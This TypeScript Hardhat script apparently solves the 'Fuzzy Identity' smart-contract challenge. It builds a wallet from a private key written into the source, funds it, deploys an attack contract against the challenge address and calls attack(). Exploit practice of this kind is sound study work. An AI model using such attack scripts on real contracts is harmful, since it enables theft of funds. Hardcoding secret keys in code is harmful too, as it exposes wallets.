import { Wallet, utils } from "ethers";
import { ethers } from "hardhat";

const contractAddress = "0xB07E0196702A1FA6fFDAf5C1561b74AB0bdF00Cb";

async function main() {
  const challengeFactory = await ethers.getContractFactory("FuzzyIdentityChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  const [owner] = await ethers.getSigners();

  // const wallet = getWallet();
  const wallet = new Wallet("0xd9049714b21da5008b14de9ebe26051f79cab7025b3aba800a6a7fc4f4267973", owner.provider);

  let tx;
  tx = await owner.sendTransaction({
    to: wallet.address,
    value: utils.parseEther("0.1"),
  });
  await tx.wait();

  const attackFactory = await ethers.getContractFactory("FuzzyIdentityAttack");
  const attackContract = await attackFactory.connect(wallet).deploy(challengeContract.address);
  await attackContract.deployed();

  tx = await attackContract.attack();
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
